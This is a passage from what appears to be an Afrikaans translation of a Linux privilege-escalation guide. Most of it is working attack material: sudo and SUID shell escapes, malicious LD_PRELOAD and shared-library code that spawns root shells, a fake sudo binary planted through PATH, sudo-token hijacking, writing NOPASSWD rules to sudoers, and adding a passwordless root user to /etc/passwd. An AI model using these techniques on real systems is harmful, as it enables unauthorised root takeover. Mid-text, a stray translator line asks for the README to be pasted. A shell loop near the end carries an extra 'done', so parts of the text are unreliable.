```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Kontroleer of jy traffic kan sniff. As jy dit kan, kan jy dalk 'n paar credentials vang.
```
timeout 1 tcpdump
```
## Gebruikers

### Generiese Enumerasie

Kontroleer **wie** jy is, watter **bevoegdhede** jy het, watter **gebruikers** in die stelsels is, watter daarvan kan **aanmeld** en watter een het **root-bevoegdhede:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

Sommige Linux-weergawes is geraak deur 'n fout wat gebruikers met **UID > INT_MAX** toelaat om escalate privileges. Meer inligting: [hier](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [hier](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### Groepe

Kontroleer of jy 'n **lid van 'n groep** is wat jou root privileges kan gee:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Klembord

Kontroleer of daar iets interessant in die klembord is (indien moontlik)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Wagwoordbeleid
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Bekende passwords

As jy enige password van die omgewing ken, probeer om as elke user te login met daardie password.

### Su Brute

Indien jy nie omgee om baie noise te maak en die `su` en `timeout` binaries op die rekenaar teenwoordig is nie, kan jy probeer om users te brute-force met [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) met die `-a` parameter probeer ook om users te brute-force.

## Skryfbare PATH-misbruik

### $PATH

Indien jy vind dat jy binne 'n folder op die $PATH kan write, kan jy moontlik privileges escalate deur 'n backdoor in die writable folder te create met die naam van 'n command wat deur 'n ander user (idealiter root) uitgevoer gaan word en wat nie loaded word vanaf 'n folder wat voor jou writable folder op die $PATH lê nie.

### SUDO and SUID

Jy mag dalk toegelaat word om 'n command met sudo uit te voer, of dit kan die suid bit hê. Kontroleer dit met:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Sommige **onverwagte opdragte laat jou toe om lêers te lees en/of te skryf of selfs 'n opdrag uit te voer.** Byvoorbeeld:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo configuration kan 'n gebruiker toelaat om 'n opdrag met 'n ander gebruiker se regte uit te voer sonder om die wagwoord te ken.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
In hierdie voorbeeld kan die gebruiker `demo` `vim` as `root` uitvoer; dit is nou eenvoudig om 'n shell te kry deur 'n ssh key in die root-gids te voeg of deur `sh` aan te roep.
```
sudo vim -c '!sh'
```
### SETENV

Hierdie direktief laat die gebruiker toe om **set an environment variable** terwyl iets uitgevoer word:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Hierdie voorbeeld, **gebaseer op HTB machine Admirer**, was **vulnerable** vir **PYTHONPATH hijacking** om 'n arbitrêre python library te laai terwyl die skrip as root uitgevoer word:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV behou via sudo env_keep → root shell

Indien sudoers `BASH_ENV` behou (bv. `Defaults env_keep+="ENV BASH_ENV"`), kan jy Bash se nie-interaktiewe opstartgedrag benut om ewekansige kode as root uit te voer wanneer ’n toegelate opdrag aangeroep word.

- Why it works: Vir nie-interaktiewe shells evalueer Bash `$BASH_ENV` en laai daardie lêer voordat die teiken-skrip uitgevoer word. Baie sudo-reëls laat toe om ’n script of ’n shell-wrapper uit te voer. As `BASH_ENV` deur sudo behou word, word jou lêer met root-bevoegdhede ingelaai.

- Vereistes:
- ’n sudo-reël wat jy kan gebruik (enige teiken wat `/bin/bash` nie-interaktief aanroep, of enige bash-skrip).
- `BASH_ENV` teenwoordig in `env_keep` (kontroleer met `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Verharding:
- Verwyder `BASH_ENV` (en `ENV`) uit `env_keep`, verkies `env_reset`.
- Vermy shell wrappers vir sudo-toegestane opdragte; gebruik minimale binaries.
- Oorweeg sudo I/O logging en waarskuwings wanneer bewaarde env vars gebruik word.

### Paaie wat sudo-uitvoering omseil

**Gaan na** om ander lêers te lees of gebruik **symlinks**. Byvoorbeeld in sudoers file: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
As 'n **wildcard** gebruik word (\*), is dit selfs makliker:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Teenmaatreëls**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo-opdrag/SUID-binarie sonder opdragpad

As die **sudo toestemming** aan 'n enkele opdrag **gegee word sonder om die pad te spesifiseer**: _hacker10 ALL= (root) less_ kan jy dit uitbuit deur die PATH-veranderlike te verander.
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Hierdie tegniek kan ook gebruik word as 'n **suid** binary **voer 'n ander opdrag uit sonder om die pad daarna te spesifiseer (kontroleer altyd met** _**strings**_ **die inhoud van 'n vreemde SUID binary)**).

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary met die pad na die opdrag

As die **suid** binary **'n ander opdrag uitvoer en die pad spesifiseer**, kan jy probeer om **export a function** te skep met die naam van die opdrag wat die suid-lêer aanroep.

Byvoorbeeld, as 'n suid binary _**/usr/sbin/service apache2 start**_ aanroep, moet jy probeer om die function te skep en dit te export:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Wanneer jy dan die suid binary aanroep, sal hierdie funksie uitgevoer word

### LD_PRELOAD & **LD_LIBRARY_PATH**

Die **LD_PRELOAD** omgewingsveranderlike word gebruik om een of meer gedeelde biblioteke (.so files) aan te dui wat deur die loader gelaai moet word voor alle ander, insluitend die standaard C-biblioteek (`libc.so`). Hierdie proses staan bekend as die voorlaai van 'n biblioteek.

Om stelselsekuriteit te handhaaf en te voorkom dat hierdie funksie misbruik word, veral met **suid/sgid** executables, dwing die stelsel sekere voorwaardes af:

- Die loader ignoreer **LD_PRELOAD** vir executables waar die real user ID (_ruid_) nie met die effective user ID (_euid_) ooreenstem nie.
- Vir executables met suid/sgid word slegs biblioteke in standaardpade wat ook suid/sgid is, voorafgelaai.

Privilege escalation kan plaasvind as jy die vermoë het om opdragte met `sudo` uit te voer en die uitset van `sudo -l` die stelling **env_keep+=LD_PRELOAD** insluit. Hierdie konfigurasie laat toe dat die **LD_PRELOAD** omgewingsveranderlike behoue bly en erken word selfs wanneer opdragte met `sudo` uitgevoer word, wat moontlik kan lei tot die uitvoering van ewekansige kode met verhoogde regte.
```
Defaults        env_keep += LD_PRELOAD
```
Stoor as **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Dan **compile it** deur te gebruik:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Uiteindelik, **escalate privileges** wat uitgevoer word
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> ’n Soortgelyke privesc kan misbruik word as die aanvaller die **LD_LIBRARY_PATH** omgewingsveranderlike beheer, omdat hy die pad beheer waar biblioteke gesoek gaan word.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Wanneer jy 'n binary met **SUID** toestemmings teëkom wat vreemd lyk, is dit 'n goeie praktyk om te verifieer of dit **.so**-lêers behoorlik laai. Dit kan nagegaan word deur die volgende opdrag uit te voer:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Byvoorbeeld, die voorkoms van ’n fout soos _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ dui op ’n moontlikheid vir uitbuiting.

Om dit uit te buiten, skep ’n C-lêer, byvoorbeeld _"/path/to/.config/libcalc.c"_, wat die volgende kode bevat:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Hierdie kode, sodra dit gekompileer en uitgevoer is, poog om voorregte te verhoog deur lêertoestemmings te manipuleer en 'n shell met verhoogde voorregte uit te voer.

Kompileer die bogenoemde C-lêer tot 'n shared object (.so)-lêer met:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Uiteindelik behoort die aangetasde SUID binary die exploit te aktiveer, wat 'n potensiële system compromise moontlik maak.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Nou dat ons 'n SUID binary gevind het wat 'n library laai vanaf 'n folder waarin ons kan write, kom ons skep die library in daardie folder met die nodige naam:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
As jy 'n fout soos
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
dit beteken dat die biblioteek wat jy gegenereer het 'n funksie met die naam `a_function_name` moet hê.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) is 'n gekeurde lys van Unix-binaries wat deur 'n aanvaller misbruik kan word om plaaslike sekuriteitsbeperkings te omseil. [**GTFOArgs**](https://gtfoargs.github.io/) is dieselfde maar vir gevalle waar jy **slegs argumente kan inject** in 'n opdrag.

Die projek versamel legitieme funksies van Unix-binaries wat misbruik kan word om uit beperkte shells te breek, voorregte te verhoog of te behou, lêers oor te dra, bind en reverse shells te spawn, en ander post-exploitation take te vergemaklik.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

If you can access `sudo -l` you can use the tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) to check if it finds how to exploit any sudo rule.

### Hergebruik van sudo tokens

In gevalle waar jy **sudo access** het maar nie die wagwoord nie, kan jy voorregte verhoog deur **te wag vir 'n sudo-opdraguitvoering en dan die sessie-token te kap**.

Vereistes om voorregte te eskaleer:

- Jy het reeds 'n shell as gebruiker "_sampleuser_"
- "_sampleuser_" het **`sudo` gebruik** om iets in die **laaste 15mins** uit te voer (by verstek is dit die duur van die sudo token wat ons toelaat om `sudo` te gebruik sonder om 'n wagwoord in te voer)
- `cat /proc/sys/kernel/yama/ptrace_scope` is 0
- `gdb` is toeganklik (jy kan dit oplaai)

(Jy kan tydelik `ptrace_scope` aktiveer met `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` of permanent deur `/etc/sysctl.d/10-ptrace.conf` te wysig en `kernel.yama.ptrace_scope = 0` te stel)

If all these requirements are met, **you can escalate privileges using:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) will create the binary `activate_sudo_token` in _/tmp_. You can use it to **activate the sudo token in your session** (you won't get automatically a root shell, do `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- Die **tweede exploit** (`exploit_v2.sh`) sal ’n sh shell in _/tmp_ skep wat deur root besit word met setuid.
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- Die **derde exploit** (`exploit_v3.sh`) **sal 'n sudoers file skep** wat **sudo tokens ewigdurend maak en alle gebruikers toelaat om sudo te gebruik**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

As jy **skryfpermissies** in die gids of op enige van die geskepte lêers binne die gids het, kan jy die binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) gebruik om 'n **sudo token vir 'n gebruiker en PID te skep**.\
Byvoorbeeld, as jy die lêer _/var/run/sudo/ts/sampleuser_ kan oorskryf en jy het 'n shell as daardie gebruiker met PID 1234, kan jy **sudo privileges verkry** sonder om die wagwoord te ken deur:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Die lêer `/etc/sudoers` en die lêers binne `/etc/sudoers.d` konfigureer wie `sudo` kan gebruik en hoe. Hierdie lêers kan **standaard slegs deur gebruiker root en groep root gelees word**.\
**As** jy hierdie lêer kan **lees**, kan jy moontlik **interessante inligting bekom**, en as jy enige lêer kan **skryf**, sal jy in staat wees om **escalate privileges**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
As jy kan skryf, kan jy hierdie toestemming misbruik.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Nog 'n manier om hierdie permissions te misbruik:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Daar is 'n paar alternatiewe vir die `sudo` binary soos `doas` vir OpenBSD; onthou om sy configuration by `/etc/doas.conf` na te gaan.
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

As jy weet dat 'n **gebruiker gewoonlik op 'n masjien koppel en `sudo` gebruik** om voorregte te verhoog en jy het 'n shell binne daardie gebruiker-konteks, kan jy **'n nuwe sudo uitvoerbare** skep wat jou kode as root sal uitvoer en daarna die gebruiker se opdrag. Dan, **wysig die $PATH** van die gebruiker-konteks (byvoorbeeld deur die nuwe pad in `.bash_profile` by te voeg) sodat wanneer die gebruiker `sudo` uitvoer, jou sudo-uitvoerbare uitgevoer word.

Neem kennis dat as die gebruiker 'n ander shell (nie bash nie) gebruik, jy ander lêers sal moet wysig om die nuwe pad by te voeg. Byvoorbeeld[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) wysig `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Jy kan nog 'n voorbeeld vind in [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Of deur iets soos die volgende uit te voer:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Gedeelde biblioteek

### ld.so

Die lêer `/etc/ld.so.conf` dui aan **waarheen die gelaaide konfigurasielêers vandaan kom**. Tipies bevat hierdie lêer die volgende pad: `include /etc/ld.so.conf.d/*.conf`

Dit beteken dat die konfigurasielêers van `/etc/ld.so.conf.d/*.conf` gelees sal word. Hierdie konfigurasielêers **wys na ander vouers** waar **libraries** gaan gesoek word. Byvoorbeeld, die inhoud van `/etc/ld.so.conf.d/libc.conf` is `/usr/local/lib`. **Dit beteken dat die stelsel vir libraries binne `/usr/local/lib` sal soek**.

Indien om een of ander rede **a user has write permissions** op enige van die aangeduide paaie: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, enige lêer binne `/etc/ld.so.conf.d/` of enige vouer binne die konfigurasielêer in `/etc/ld.so.conf.d/*.conf` kan hy moontlik **escalate privileges**.\
Kyk na **how to exploit this misconfiguration** op die volgende blad:

{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Deur die lib na `/var/tmp/flag15/` te kopieer, sal dit deur die program op hierdie plek gebruik word soos gespesifiseer in die `RPATH`-veranderlike.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Skep dan 'n kwaadwillige biblioteek in `/var/tmp` met `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Vermoëns

Linux capabilities verskaf 'n **substel van die beskikbare root-regte aan 'n proses**. Dit verdeel effektief root **regte in kleiner en onderskeibare eenhede**. Elke van hierdie eenhede kan dan onafhanklik aan prosesse toegeken word. Op hierdie manier word die volle stel regte verminder, wat die risiko's van uitbuiting verlaag.\
Lees die volgende bladsy om **meer te leer oor vermoëns en hoe om dit te misbruik**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Gids-toestemmings

In 'n gids, die **bit vir "execute"** dui aan dat die betrokke gebruiker in die vouer kan "**cd**" into die folder.\
Die **"read"** bit dui aan dat die gebruiker die **lêers** kan **lys**, en die **"write"** bit dui aan dat die gebruiker **lêers kan verwyder** en **nuwe lêers kan skep**.

## ACLs

Access Control Lists (ACLs) verteenwoordig die sekondêre laag van diskresionêre toestemmings, en is in staat om **die tradisionele ugo/rwx-permissies te oorheers**. Hierdie toestemmings verbeter beheer oor lêer- of gids-toegang deur spesifieke gebruikers wat nie eienaars is of deel van die groep is nie, regte toe te ken of te weier. Hierdie vlak van **granulariteit verseker meer presiese toegangsbestuur**. Verdere besonderhede kan gevind word [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Gee** gebruiker "kali" lees- en skryfregte oor 'n lêer:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Kry** lêers met spesifieke ACLs van die stelsel:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Oop shell sessies

In **oude weergawes** kan jy 'n **shell** sessie van 'n ander gebruiker (**root**) **hijack**.\
In **nuutste weergawes** sal jy slegs na screen sessies van **jou eie gebruiker** **connect**. Tog kan jy **interessante inligting binne die sessie** vind.

### screen sessions hijacking

**Lys screen sessies**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Koppel aan 'n sessie**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessies hijacking

Dit was 'n probleem met **ou tmux-weergawes**. Ek kon nie 'n tmux (v2.1) sessie wat deur root geskep is, as 'n nie-bevoorregte gebruiker hijack nie.

**Lys tmux sessies**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Koppel aan 'n sessie**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Kyk na **Valentine box from HTB** vir 'n voorbeeld.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Alle SSL- en SSH-sleutels wat op Debian-gebaseerde stelsels (Ubuntu, Kubuntu, etc) tussen September 2006 en 13 Mei 2008 gegenereer is, kan deur hierdie fout geraak wees.\
Hierdie fout word veroorsaak wanneer 'n nuwe ssh-sleutel in daardie OS geskep word, aangesien **slegs 32,768 variasies moontlik was**. Dit beteken dat al die moontlikhede bereken kan word en **as jy die ssh publieke sleutel het, kan jy die ooreenstemmende private sleutel soek**. Die berekende moontlikhede kan hier gevind word: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interessante konfigurasiewaardes

- **PasswordAuthentication:** Gee aan of wagwoordverifikasie toegelaat word. Die verstek is `no`.
- **PubkeyAuthentication:** Gee aan of publieke sleutelverifikasie toegelaat word. Die verstek is `yes`.
- **PermitEmptyPasswords**: Wanneer wagwoordverifikasie toegelaat word, gee dit aan of die bediener toelaat dat daar op rekeninge met leë wagwoorde ingelog word. Die verstek is `no`.

### PermitRootLogin

Gee aan of root kan aanmeld met ssh, verstek is `no`. Moontlike waardes:

- `yes`: root kan aanmeld met wagwoord en private sleutel
- `without-password` or `prohibit-password`: root kan slegs met 'n private sleutel aanmeld
- `forced-commands-only`: Root kan slegs aanmeld met 'n private sleutel en as die commands-opsies gespesifiseer is
- `no` : nee

### AuthorizedKeysFile

Gee aan watter lêers die publieke sleutels bevat wat vir gebruikersverifikasie gebruik kan word. Dit kan tokens soos `%h` bevat, wat vervang sal word deur die huisgids. **Jy kan absolute paaie aandui** (wat begin met `/`) of **relatiewe paaie vanaf die gebruiker se huisgids**. Byvoorbeeld:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Daardie konfigurasie sal aandui dat indien jy probeer aanmeld met die **privaat** sleutel van die gebruiker "**testusername**" gaan ssh die publieke sleutel van jou sleutel vergelyk met dié wat in `/home/testusername/.ssh/authorized_keys` en `/home/testusername/access` geleë is

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding laat jou toe om **jou plaaslike SSH-sleutels te gebruik in plaas daarvan om sleutels** (sonder wagwoordfrases!) op jou server te laat lê. Dit beteken dat jy via ssh **na 'n host kan spring** en van daaruit **na 'n ander host kan spring** deur die **sleutel** te gebruik wat op jou **oorspronklike host** geleë is.

Jy moet hierdie opsie in `$HOME/.ssh.config` stel soos volg:
```
Host example.com
ForwardAgent yes
```
Let daarop dat as `Host` `*` is, elke keer as die gebruiker na 'n ander masjien spring, daardie gasheer toegang tot die sleutels sal hê (wat 'n sekuriteitsprobleem is).

Die lêer `/etc/ssh_config` kan hierdie opsies **oorheers** en hierdie konfigurasie toelaat of weier.\
Die lêer `/etc/sshd_config` kan **toelaat** of **weier** ssh-agent forwarding met die sleutelwoord `AllowAgentForwarding` (standaard is toelaat).

As jy vind dat Forward Agent in 'n omgewing geconfigureer is, lees die volgende bladsy aangesien **jy dit moontlik kan misbruik om privilegies te eskaleer**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Interessante Lêers

### Profiel-lêers

Die lêer `/etc/profile` en die lêers in `/etc/profile.d/` is **skripte wat uitgevoer word wanneer 'n gebruiker 'n nuwe shell begin**. Daarom, as jy enigeen daarvan kan **skryf of wysig, kan jy privilegies eskaleer**.
```bash
ls -l /etc/profile /etc/profile.d/
```
As 'n vreemde profielskrip gevind word, moet jy dit nagaan vir **gevoelige besonderhede**.

### Passwd/Shadow Lêers

Afhangend van die OS kan die `/etc/passwd` en `/etc/shadow` lêers 'n ander naam hê of daar kan 'n rugsteun wees. Daarom word dit aanbeveel om **al hulle te vind** en **te kontroleer of jy hulle kan lees** om te sien **of daar hashes** in die lêers is:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
In sommige gevalle kan jy **password hashes** in die `/etc/passwd` (of gelykwaardige) lêer vind
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Skryfbare /etc/passwd

Eerstens, genereer 'n wagwoord met een van die volgende opdragte.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
I don’t have the contents of src/linux-hardening/privilege-escalation/README.md. Plak asseblief die README.md-inhoud (of die gedeeltes wat jy vertaal wil hê) hier, dan sal ek dit na Afrikaans vertaal en die sin "Then add the user `hacker` and add the generated password." (met `hacker` ongewysig) by die vertaalde README voeg.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Byvoorbeeld: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Jy kan nou die `su`-opdrag gebruik met `hacker:hacker`

Alternatiewelik kan jy die volgende reëls gebruik om 'n dummy-gebruiker sonder 'n wagwoord by te voeg.\ WAARSKUWING: Jy mag die huidige sekuriteit van die masjien verswak.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
LET OP: Op BSD-platforms is `/etc/passwd` geleë by `/etc/pwd.db` en `/etc/master.passwd`, ook is `/etc/shadow` hernoem na `/etc/spwd.db`.

Jy moet nagaan of jy kan **skryf in sommige sensitiewe lêers**. Byvoorbeeld, kan jy skryf na 'n **dienskonfigurasielêer**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Byvoorbeeld, as die masjien 'n **tomcat** server loop en jy kan die **Tomcat service configuration file binne /etc/systemd/ wysig,** dan kan jy die reëls wysig:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Jou backdoor sal uitgevoer word die volgende keer wat tomcat begin.

### Kontroleer gidse

Die volgende gidse kan rugsteunkopieë of interessante inligting bevat: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Waarskynlik sal jy nie die laaste een kan lees nie, maar probeer dit)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Eienaardige ligging/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Gewysigde lêers in die afgelope minute
```bash
